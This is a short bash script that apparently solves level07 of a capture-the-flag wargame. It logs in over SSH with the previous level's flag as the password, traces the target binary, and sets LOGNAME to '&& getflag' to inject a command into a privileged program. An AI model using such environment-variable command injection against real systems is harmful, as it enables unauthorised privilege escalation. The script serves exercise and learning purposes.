#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level07@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level06/flag)

if [ $# -eq 1 ]; then
	# ssh
	sshpass -p $PASSWORD ssh -q $HOST -p $SSHPORT<<'ENDSSH'
		ltrace ./level07

		echo "[+] Redefine LOGNAME var env"
		echo "LOGNAME: $LOGNAME"
		export LOGNAME="&& getflag"
		echo "LOGNAME: $LOGNAME"
		./level07
ENDSSH

else
	printf "usage: ./script.sh [host]\n\texample [host] - 192.168.1.128"
fi
